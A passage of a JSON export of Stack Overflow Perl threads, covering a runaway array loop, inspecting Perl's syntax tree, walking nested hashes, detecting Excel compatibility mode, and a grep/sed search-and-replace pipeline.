"https://www.gravatar.com/avatar/a437789b76684303e2918c0112b7a7d0?s=128&d=identicon&r=PG&f=1", "display_name": "user3499381", "link": "https://stackoverflow.com/users/3499381/user3499381"}, "edited": false, "score": 0, "creation_date": 1521072790, "post_id": 49275369, "comment_id": 85582358, "body": "yes, i did rewrite the loop, but when i set the loop to stop at one less than the one that gave me problems, it did not hang. when i set it explicitly to the one that caused the problem, it would hang (i was not setting the array length). once i escaped the quote it worked fine. i have it working also with $size now too. thanks for all the help, everyone. i appreciate it. i&#39;m not a programmer so i know i can ask some dumb questions sometimes."}], "tags": [], "owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "is_accepted": false, "score": 0, "last_activity_date": 1521023550, "creation_date": 1521023550, "answer_id": 49275369, "question_id": 49264731, "link": "https://stackoverflow.com/questions/49264731/perl-string-replacing-quotes-causes-the-browser-to-hang/49275369#49275369", "title": "Perl string replacing quotes causes the browser to hang", "body": "<p>The problem has nothing to do with your regex, it's down to how you've written the loop</p>\n\n<pre><code>for ($i=0; $i &lt;= @myArray.length; $i++)\n</code></pre>\n\n<p>If, for example, your array contained 5 elements, the loop will allow <code>$i</code> to equal 5 which equates to the 6th element in the array. Because of this when you do the regex on <code>$myArray[5]</code> it will populate it with a value and that will alter the size of the array. And because the size of the array has increased, the loop won't terminate and will continue growing the array until you run out of memory.</p>\n\n<p>If you're going to use <code>&lt;=</code> in such a loop you want to use <code>$#myArray</code> to get the highest index in use, like this:</p>\n\n<pre><code>for ($i=0; $i &lt;= $#myArray; $i++)\n</code></pre>\n\n<p>It looks like you've fixed your problem by luck, because you've stored the size of the array in <code>$size</code> and presumably have re-written the loop like </p>\n\n<pre><code>for ($i=0; $i &lt;= $size; $i++)\n</code></pre>\n\n<p>so it will create just one extra element in the array and stop. If you're going to use the size of the array, you want to use <code>&lt;</code> like this.</p>\n\n<pre><code>for ($i=0; $i &lt; $size; $i++)\n</code></pre>\n"}], "owner": {"reputation": 327, "user_id": 3499381, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/a437789b76684303e2918c0112b7a7d0?s=128&d=identicon&r=PG&f=1", "display_name": "user3499381", "link": "https://stackoverflow.com/users/3499381/user3499381"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 71, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1521023550, "creation_date": 1520970499, "question_id": 49264731, "link": "https://stackoverflow.com/questions/49264731/perl-string-replacing-quotes-causes-the-browser-to-hang", "title": "Perl string replacing quotes causes the browser to hang", "body": "<p>I'm reading in some data and need to remove the double quotes. I'm using </p>\n\n<pre><code>$myArray[$i] =~ tr/\"//d;\n</code></pre>\n\n<p>and although that works, when it gets to a particular element in the array, it hangs the browser. that element is:</p>\n\n<pre><code>\"earnings\":\"{\\\"29262\\\":\\\"8.0595\\\"}\"\n</code></pre>\n\n<p>I basically just need to get rid of the quotes, brackets, and slashes so it would look like <strong>earnings:29262:8.0595</strong> so I can better deal with the data. </p>\n"}, {"tags": ["perl", "parsing", "abstract-syntax-tree"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1520960934, "post_id": 49261862, "comment_id": 85527513, "body": "Take a look at the B::Concise module for example."}, {"owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 2, "creation_date": 1520962268, "post_id": 49261862, "comment_id": 85528306, "body": "Apart from the <a href=\"http://p3rl.org/B\" rel=\"nofollow noreferrer\"><code>B</code></a>/<a href=\"http://p3rl.org/O\" rel=\"nofollow noreferrer\"><code>O</code></a> core modules, there was also <a href=\"http://perldoc.perl.org/5.10.0/perldelta.html#MAD\" rel=\"nofollow noreferrer\">MAD</a> (unmaintained, meanwhile removed). Most software that parses Perl is either a source filter (breaks easily) or builds on <a href=\"http://perldoc.perl.org/perlapi.html#PL_keyword_plugin\" rel=\"nofollow noreferrer\"><code>PL_keyword_plugin</code></a> (robust, but limited). See <a href=\"https://grep.cpan.me/?q=PL_keyword_plugin\" rel=\"nofollow noreferrer\">examples</a>."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 2, "creation_date": 1520962479, "post_id": 49261862, "comment_id": 85528444, "body": "@daxim, <code>PL_keyword_plugin</code> is actually problematic, and has been supplanted Devel::CallParser."}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 1, "creation_date": 1520969070, "post_id": 49261862, "comment_id": 85532019, "body": "<a href=\"http://www.perlmonks.org/?node_id=44722\" rel=\"nofollow noreferrer\">It&#39;s not just because of the BEGIN blocks</a>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 1, "creation_date": 1520970756, "post_id": 49261862, "comment_id": 85532893, "body": "@mob, It doesn&#39;t require Perl to parse prototypes, and <code>use</code> statements are <code>BEGIN</code> blocks too, so that link doesn&#39;t add anything new. /// That said, it&#39;s surely possible to modify opcode at run-time too. But does anyone do that?"}], "answers": [{"comments": [{"owner": {"reputation": 54872, "user_id": 1521179, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/MH7pk.png?s=128&g=1", "display_name": "amon", "link": "https://stackoverflow.com/users/1521179/amon"}, "edited": false, "score": 0, "creation_date": 1521065490, "post_id": 49283285, "comment_id": 85579988, "body": "B::Deparse does evaluate BEGIN \u2013 it just takes the opcodes after parsing and renders them as Perl source code, whereas B::Concise renders them in a more direct notation. Note that both of these modules are pure-Perl, so you can take a peek at how they traverse the opcode structure. Perl opcodes are both an AST and VM instructions."}, {"owner": {"reputation": 555, "user_id": 1871626, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3a8be1db62f4975f0e8b9cab4c7208bd?s=128&d=identicon&r=PG", "display_name": "Alejandro Pulver", "link": "https://stackoverflow.com/users/1871626/alejandro-pulver"}, "reply_to_user": {"reputation": 54872, "user_id": 1521179, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/MH7pk.png?s=128&g=1", "display_name": "amon", "link": "https://stackoverflow.com/users/1521179/amon"}, "edited": false, "score": 0, "creation_date": 1521100343, "post_id": 49283285, "comment_id": 85590294, "body": "I thought it didn&#39;t because even at level 7, use statements still expanded to the mentioned blocks. Perhaps I was expecting a big file with everything resolved (like the output of the C preprocessor which expands <code>#include</code>)."}, {"owner": {"reputation": 54872, "user_id": 1521179, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/MH7pk.png?s=128&g=1", "display_name": "amon", "link": "https://stackoverflow.com/users/1521179/amon"}, "edited": false, "score": 0, "creation_date": 1521127383, "post_id": 49283285, "comment_id": 85608481, "body": "Perl&#39;s multi-phase compilation model is very differen&#39;t from C&#39;s text-based preprocessor. It seems your actual problem (\u201cHow can I pack all used Perl modules into a single script?\u201d or \u201cWhy does B::Deparse expand use statements like this?\u201d) is very different from the problem in your question: \u201cHow can I examine Perl&#39;s syntax tree\u201d. Can you perhaps ask a new question that explains your actual problem more clearly?"}, {"owner": {"reputation": 555, "user_id": 1871626, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3a8be1db62f4975f0e8b9cab4c7208bd?s=128&d=identicon&r=PG", "display_name": "Alejandro Pulver", "link": "https://stackoverflow.com/users/1871626/alejandro-pulver"}, "reply_to_user": {"reputation": 54872, "user_id": 1521179, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/MH7pk.png?s=128&g=1", "display_name": "amon", "link": "https://stackoverflow.com/users/1521179/amon"}, "edited": false, "score": 0, "creation_date": 1521191397, "post_id": 49283285, "comment_id": 85634866, "body": "It was an analogy, I know it&#39;s more similar to syntax macros (LISP) rather than text substitutions. But the idea was: if Deparse still outputs those blocks then the rest of the code syntax could be changed by an imported module. Obviously in a dynamic language with introspection there is no end to this, as a program could be evaluating any generated string during execution. But I wanted to know if it was possible to get the code after the <code>BEGIN</code> processing phase in Perl form for a syntax tree. Does it make sense?"}], "tags": [], "owner": {"reputation": 555, "user_id": 1871626, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3a8be1db62f4975f0e8b9cab4c7208bd?s=128&d=identicon&r=PG", "display_name": "Alejandro Pulver", "link": "https://stackoverflow.com/users/1871626/alejandro-pulver"}, "is_accepted": true, "score": 2, "last_activity_date": 1521106140, "last_edit_date": 1521106140, "creation_date": 1521045649, "answer_id": 49283285, "question_id": 49261862, "link": "https://stackoverflow.com/questions/49261862/parsing-perl-5-and-examining-the-syntax-tree/49283285#49283285", "title": "Parsing Perl 5 and examining the syntax tree", "body": "<p>So basically there are a few options:</p>\n\n<ol>\n<li><p>For static analysis, use <a href=\"https://metacpan.org/pod/PPI\" rel=\"nofollow noreferrer\">PPI</a>, which has the downside of not processing Perl code at <code>BEGIN</code> blocks. This would be analogous to \"parsing\".</p></li>\n<li><p>For dynamic analysis, use Use <a href=\"https://perldoc.perl.org/B/Concise.html\" rel=\"nofollow noreferrer\">B::Concise</a> to get the internal opcodes used for execution. This would be analogous to \"compiling\" (to the Perl VM).</p></li>\n<li><p>A combination of both would be using <a href=\"https://metacpan.org/pod/B::Deparse\" rel=\"nofollow noreferrer\">B::Deparse</a> to get Perl code of the internal representation (instead of VM opcodes), and then send it to <a href=\"https://metacpan.org/pod/PPI\" rel=\"nofollow noreferrer\">PPI</a> for building the tree.</p></li>\n</ol>\n\n<p><strong>EDIT</strong>: clarified point 3 based on comment. Still don't know a command that would expand imports and output a single big file (so that syntax extensions are resolved).</p>\n"}], "owner": {"reputation": 555, "user_id": 1871626, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3a8be1db62f4975f0e8b9cab4c7208bd?s=128&d=identicon&r=PG", "display_name": "Alejandro Pulver", "link": "https://stackoverflow.com/users/1871626/alejandro-pulver"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 681, "favorite_count": 0, "accepted_answer_id": 49283285, "answer_count": 1, "score": 9, "last_activity_date": 1521106140, "creation_date": 1520960558, "last_edit_date": 1520987577, "question_id": 49261862, "link": "https://stackoverflow.com/questions/49261862/parsing-perl-5-and-examining-the-syntax-tree", "title": "Parsing Perl 5 and examining the syntax tree", "body": "<p>I've read and understood that it's not possible to parse Perl 5 code without a Perl interpreter because of the <code>BEGIN</code> blocks.</p>\n\n<p>I know there are standalone parsers like\n<a href=\"https://metacpan.org/pod/PPI\" rel=\"noreferrer\"><code>PPI</code></a>\n(used by <a href=\"https://metacpan.org/pod/Perl::Critic\" rel=\"noreferrer\"><code>Perl::Critic</code></a>)\nthat approximately parses the initial document.</p>\n\n<p>But I couldn't find any reference to the procedure for outputting some kind of\n<em>abstract syntax tree</em>, or whatever internal structure resembling a tree that Perl uses for the <em>execution</em> phase.</p>\n\n<p>It would be interesting to compare the internal representation for the parse and execution phases to see the code expand and change.</p>\n"}, {"tags": ["linux", "perl"], "comments": [{"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1520945904, "post_id": 49254934, "comment_id": 85516604, "body": "@H&#229;konH&#230;gland How did you find that?"}, {"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 1, "creation_date": 1520948467, "post_id": 49254934, "comment_id": 85518437, "body": "I remembered I commented on the question, so then I could easily find it on google by including my name in the search :)"}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1520949353, "post_id": 49254934, "comment_id": 85519082, "body": "@H&#229;konH&#230;gland ah cool, thanks!"}], "answers": [{"tags": [], "owner": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "is_accepted": false, "score": 1, "last_activity_date": 1520942364, "creation_date": 1520942364, "answer_id": 49255630, "question_id": 49254934, "link": "https://stackoverflow.com/questions/49254934/perl-save-a-section-of-hash-to-a-new-hash/49255630#49255630", "title": "Perl save a section of hash to a new hash", "body": "<p>You need to walk down thru the hash tree.</p>\n\n<pre><code>#!/usr/bin/env perl\n\n# always use these two\nuse strict;\nuse warnings;\n\n# use autodie to automatically die on open errors\nuse autodie;\n\nmy $hash = {\n    foo =&gt; {\n        bar =&gt; {\n                baz =&gt; \"hi\"\n            }\n        }\n    };\n\nmy @arr = qw/foo bar/;\n\nmy $hash_ref = $hash;\nfor my $key ( @arr ){\n    $hash_ref = $hash_ref-&gt;{$key};\n}\n# $hash_ref is now at the end of the array\n\nprint Dumper( $hash_ref );\n</code></pre>\n"}], "owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "closed_date": 1520943427, "answer_count": 1, "score": -1, "last_activity_date": 1520942364, "creation_date": 1520940254, "last_edit_date": 1592644375, "question_id": 49254934, "link": "https://stackoverflow.com/questions/49254934/perl-save-a-section-of-hash-to-a-new-hash", "closed_reason": "Duplicate", "title": "Perl save a section of hash to a new hash", "body": "<h3>Code</h3>\n<pre><code>use strict;\nuse warnings;\n\nmy $hash = {\n    foo =&gt; {\n        bar =&gt; {\n                baz =&gt; &quot;hi&quot;\n            }\n        }\n    };\n\nmy @arr = qw/foo bar/;\n</code></pre>\n<hr />\n<h3>Question</h3>\n<p>Is there any way in perl to build up a hash ref string/identifier using an array/hash to specify the keys?</p>\n<p>So with the above code I would want to take the strings from <code>@arr</code> and use them to generate the string</p>\n<pre><code>my $newhash = $hash-&gt;{'foo'}-&gt;{'bar'};\n</code></pre>\n<p>This is just an example and the number of nested hashes could be variable</p>\n<hr />\n<p>Tried</p>\n<p>So I know that if I knew the level of nesting then I could just use</p>\n<pre><code>my $newhash = { map { $_ =&gt; $hash-&gt;{$_} } qw/some values/ };\n</code></pre>\n<p>but I can't seem to come up with a way when the nesting isn't known.</p>\n<h3>Extra</h3>\n<pre><code>perl 5.20\n</code></pre>\n<p>Any more info needed please ask.</p>\n"}, {"tags": ["excel", "perl"], "answers": [{"tags": [], "owner": {"reputation": 981, "user_id": 7019069, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/SQoGB.jpg?s=128&g=1", "display_name": "nck", "link": "https://stackoverflow.com/users/7019069/nck"}, "is_accepted": false, "score": 1, "last_activity_date": 1617379616, "creation_date": 1617379616, "answer_id": 66922075, "question_id": 49254035, "link": "https://stackoverflow.com/questions/49254035/check-if-excel-file-saved-in-compatibility-mode-without-using-excel/66922075#66922075", "title": "Check if Excel file saved in compatibility mode without using Excel", "body": "<p>I do not think that you can do this using <code>Spreadsheet::ParseExcel</code>. I have tried saving an xls file with a color from an .xlsx and saving it with 2003 compatibility. Then comparing it with an empty .xls of 2003 and I do not see any difference in my files.</p>\n<p>You can try the following code to debug it with your own files trying to find a difference that you could use:</p>\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings;\nuse Spreadsheet::ParseExcel;\nuse Data::Dumper;\nuse JSON;\n\nuse Test::More tests =&gt; 1;\n\nmy $file_1 = 'test_xls.xls';\nmy $file_2 = 'compat_xls.xls';\n\nmy @files = (\n    $file_1,\n    $file_2,\n    );\n\nmy @workbooks;\nforeach my $file (@files){\n    print(&quot;\\n\\nReading $file\\n&quot;);\n    my $parser   = Spreadsheet::ParseExcel-&gt;new();\n    my $workbook = $parser-&gt;parse($file);\n\n    # print Dumper($workbook-&gt;{PkgStr});\n    delete $workbook-&gt;{PkgStr};\n    delete $workbook-&gt;{File};\n    delete $workbook-&gt;{Worksheet}-&gt;[0]-&gt;{MinRow};\n    delete $workbook-&gt;{Worksheet}-&gt;[0]-&gt;{RowHeight};\n    delete $workbook-&gt;{Worksheet}-&gt;[0]-&gt;{_Pos};\n    delete $workbook-&gt;{Worksheet}-&gt;[0]-&gt;{MinCol};\n    delete $workbook-&gt;{Worksheet}-&gt;[0]-&gt;{MaxCol};\n    delete $workbook-&gt;{Worksheet}-&gt;[0]-&gt;{MaxRow};\n    delete $workbook-&gt;{Worksheet}-&gt;[0]-&gt;{Cells};\n    delete $workbook-&gt;{Format}-&gt;[62];\n    push @workbooks, $workbook;\n}\n\n\n\nmy ($ok, $stack) = is_deeply($workbooks[0], $workbooks[1]);\nmy $diag = explain($stack);\nprint(Dumper($diag));\n</code></pre>\n"}], "owner": {"reputation": 137, "user_id": 7866968, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a05d28d5bbdcb5ae6c14c033b9275555?s=128&d=identicon&r=PG&f=1", "display_name": "gauss76", "link": "https://stackoverflow.com/users/7866968/gauss76"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1617379616, "creation_date": 1520937659, "last_edit_date": 1520958070, "question_id": 49254035, "link": "https://stackoverflow.com/questions/49254035/check-if-excel-file-saved-in-compatibility-mode-without-using-excel", "title": "Check if Excel file saved in compatibility mode without using Excel", "body": "<p>I have recently been experimenting with perl and some modules to read Excel files and in particular the format of thier cells.</p>\n\n<p>For example I wrote a piece of perl code that used the module ParseExcel to read a cells background colour. However while testing I noticed that for certain files the colour returned by my perl program did not match the colour reported by Excel. Eventually I found the reason for this was that the file I was reading was a .xls file saved in compatibility mode. Basically the creator of the file had used the functionality of Excel .xlsx type files (2007+) to colour some of the cells and then saved the file with the old .xls file extension that did not support the colours chosen.</p>\n\n<p>So my question: Is there any way to tell whether a given .xls file (or any other old Excel file format) has been saved in compatibility mode without usung Excel to find out? The reason I ask is that I am working under a linux environment and can't use any windows tools to analyse the files.</p>\n\n<p>Furthermore, if one could identify that a given Excel file has, indeed, been saved in compatibiity mode is there any way of knowing how the original colours were mapped to the ones that my program is telling me?</p>\n\n<p>Many thanks for any help on this.</p>\n"}, {"tags": ["perl", "unix", "grep"], "comments": [{"owner": {"reputation": 18548, "user_id": 4082052, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GUNps.jpg?s=128&g=1", "display_name": "Sundeep", "link": "https://stackoverflow.com/users/4082052/sundeep"}, "edited": false, "score": 0, "creation_date": 1520926707, "post_id": 49250467, "comment_id": 85504549, "body": "you&#39;d need <code>-l</code> option for grep to print only file names... and <code>grep -v</code> is to exclude file names or lines with <code>Header</code> ?"}], "answers": [{"comments": [{"owner": {"reputation": 793, "user_id": 3565150, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/3b6d7de9652d4f46423efe1308d3ebaf?s=128&d=identicon&r=PG&f=1", "display_name": "user3565150", "link": "https://stackoverflow.com/users/3565150/user3565150"}, "edited": false, "score": 0, "creation_date": 1520931389, "post_id": 49251166, "comment_id": 85507087, "body": "Kudos to you Allan. The last command you gave with global replacement worked good for me. Would like to know how sed takes backup with i.bak and how we can use it if required. Thanks again."}, {"owner": {"reputation": 11092, "user_id": 8794221, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81e2de0a8497383ad1889e87d91adc91?s=128&d=identicon&r=PG&f=1", "display_name": "Allan", "link": "https://stackoverflow.com/users/8794221/allan"}, "reply_to_user": {"reputation": 793, "user_id": 3565150, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/3b6d7de9652d4f46423efe1308d3ebaf?s=128&d=identicon&r=PG&f=1", "display_name": "user3565150", "link": "https://stackoverflow.com/users/3565150/user3565150"}, "edited": false, "score": 0, "creation_date": 1520931601, "post_id": 49251166, "comment_id": 85507209, "body": "@user3565150: <a href=\"https://www.gnu.org/software/sed/manual/sed.txt\" rel=\"nofollow noreferrer\">gnu.org/software/sed/manual/sed.txt</a> for the whole manual, I have edited my post with the back option of sed from the man page"}, {"owner": {"reputation": 11092, "user_id": 8794221, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81e2de0a8497383ad1889e87d91adc91?s=128&d=identicon&r=PG&f=1", "display_name": "Allan", "link": "https://stackoverflow.com/users/8794221/allan"}, "reply_to_user": {"reputation": 793, "user_id": 3565150, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/3b6d7de9652d4f46423efe1308d3ebaf?s=128&d=identicon&r=PG&f=1", "display_name": "user3565150", "link": "https://stackoverflow.com/users/3565150/user3565150"}, "edited": false, "score": 0, "creation_date": 1520931850, "post_id": 49251166, "comment_id": 85507349, "body": "@user3565150: if it solved your issue could you put it as correct answer? thanks!"}, {"owner": {"reputation": 793, "user_id": 3565150, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/3b6d7de9652d4f46423efe1308d3ebaf?s=128&d=identicon&r=PG&f=1", "display_name": "user3565150", "link": "https://stackoverflow.com/users/3565150/user3565150"}, "edited": false, "score": 0, "creation_date": 1520935246, "post_id": 49251166, "comment_id": 85509643, "body": "Done Sir !! Thanks again"}], "tags": [], "owner": {"reputation": 11092, "user_id": 8794221, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81e2de0a8497383ad1889e87d91adc91?s=128&d=identicon&r=PG&f=1", "display_name": "Allan", "link": "https://stackoverflow.com/users/8794221/allan"}, "is_accepted": true, "score": 4, "last_activity_date": 1520931632, "last_edit_date": 1520931632, "creation_date": 1520928684, "answer_id": 49251166, "question_id": 49250467, "link": "https://stackoverflow.com/questions/49250467/search-and-replace-with-grep-and-perl/49251166#49251166", "title": "Search and replace with grep and perl", "body": "<p>You can change your command in the following ways:</p>\n\n<pre><code>grep -ril \"vi_chiron\" . | xargs grep -vl Header | xargs perl -e \"s/vi_chiron/vi_huracan/\" -pi \n</code></pre>\n\n<p>or </p>\n\n<pre><code>find . -type f -exec grep -ril \"vi_chiron\" | xargs grep -vl Header | xargs perl -e \"s/vi_chiron/vi_huracan/\" -pi\n</code></pre>\n\n<p>In order to manipulate all files that do not contain <code>Header</code> and change <code>vi_chiron</code> into <code>vi_hurican</code>.</p>\n\n<p><strong>If I were you, I would simplify the chain and do it the other way around:</strong></p>\n\n<pre><code>grep -rvl Header . | xargs sed -i.bak 's/vi_chiron/vi_hurican/'\n</code></pre>\n\n<p>If you are confident enough change the <code>-i.bak</code> into <code>-i</code> in order to have sed not taking any backups. </p>\n\n<p>Also note that your change and replace is not global, if you want to put it globally use: <code>sed -i.bak 's/vi_chiron/vi_hurican/g'</code> instead.</p>\n\n<blockquote>\n  <p>'-i[SUFFIX]' '--in-place[=SUFFIX]'\n       This option specifies that files are to be edited in-place.  GNU\n       'sed' does this by creating a temporary file and sending output to\n       this file rather than to the standard output.(1).</p>\n\n<pre><code> This option implies '-s'.\n\n When the end of the file is reached, the temporary file is renamed\n to the output file's original name.  The extension, if supplied, is\n used to modify the name of the old file before renaming the\n temporary file, thereby making a backup copy(2)).\n\n This rule is followed: if the extension doesn't contain a '*', then\n it is appended to the end of the current filename as a suffix; if\n the extension does contain one or more '*' characters, then _each_\n asterisk is replaced with the current filename.  This allows you to\n add a prefix to the backup file, instead of (or in addition to) a\n suffix, or even to place backup copies of the original files into\n another directory (provided the directory already exists).\n\n If no extension is supplied, the original file is overwritten\n without making a backup.\n</code></pre>\n</blockquote>\n\n<p>source: <a href=\"https://www.gnu.org/software/sed/manual/sed.txt\" rel=\"nofollow noreferrer\">https://www.gnu.org/software/sed/manual/sed.txt</a></p>\n"}], "owner": {"reputation": 793, "user_id": 3565150, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/3b6d7de9652d4f46423efe1308d3ebaf?s=128&d=identicon&r=PG&f=1", "display_name": "user3565150", "link": "https://stackoverflow.com/users/3565150/user3565150"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 687, "favorite_count": 0, "accepted_answer_id": 49251166, "answer_count": 1, "score": 3, "last_activity_date": 1520931632, "creation_date": 1520925971, "question_id": 49250467, "link": "https://stackoverflow.com/questions/49250467/search-and-replace-with-grep-and-perl", "title": "Search and replace with grep and perl", "body": "<p>I need to replace \"vi_chiron\" with \"vi_huracan\" from all the files below. I am using the following command line and also have changed the permission to full access for all the underlying files:</p>\n\n<pre><code> grep -ri \"vi_chiron\" ./ | grep -v Header | xargs perl -e \"s/vi_chiron/vi_huracan/\" -pi\n</code></pre>\n\n<p>I am getting the error:\n       \"Can't open ./build/drivers_file.min:#: No such file or directory.\n\" and many other similar errors. Any idea why ? Below is the permission for the file:</p>\n\n<pre><code>          ll build/drivers_file.min \n          -rwxrwxrwx 1 ask vi 5860 Mar 13 12:07 build/drivers_file.min\n</code></pre>\n"}, {"tags": ["perl", "awk"], "comments": [{"owner": {"reputation": 95936, "user_id": 5866580, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1de2cd722d865edac1575102a48ecc0a?s=128&d=identicon&r=PG&f=1", "display_name": "RavinderSingh13", "link": "https://stackoverflow.com/users/5866580/ravindersingh13"}, "edited": false, "score": 1, "creation_date": 1520920521, "post_id": 49249151, "comment_id": 85501735, "body": "Welcome to Stack overflow, please add your sample Input and output in code tags. Also be more clear what you are trying to achieve here in your post."}, {"owner": {"reputation": 18548, "user_id": 4082052, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GUNps.jpg?s=128&g=1", "display_name": "Sundeep", "link": "https://stackoverflow.com/users/4082052/sundeep"}, "edited": false, "score": 0, "creation_date": 1520920813, "post_id": 49249151, "comment_id": 85501837, "body": "you need to quote the string.. I think what you are looking for is <code>awk &#39;$1==&quot;input&quot;{print $1}&#39;</code> but not sure.. also, if you are using <code>perl</code> already, why do you need <code>awk</code>?"}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1520948528, "post_id": 49249151, "comment_id": 85518477, "body": "What does <code>awk &#39;{if(\\$1 == input) print \\$1;}&#39; &lt;file&gt;  in system or by using backticks</code> mean? Show a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> (note - &quot;Complete&quot;) of the problem as right now you&#39;re getting answers based on what you&#39;ve shown us but what you <b>haven&#39;t</b> shown us yet is the actual problem you&#39;re trying to solve."}], "answers": [{"tags": [], "owner": {"reputation": 95936, "user_id": 5866580, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1de2cd722d865edac1575102a48ecc0a?s=128&d=identicon&r=PG&f=1", "display_name": "RavinderSingh13", "link": "https://stackoverflow.com/users/5866580/ravindersingh13"}, 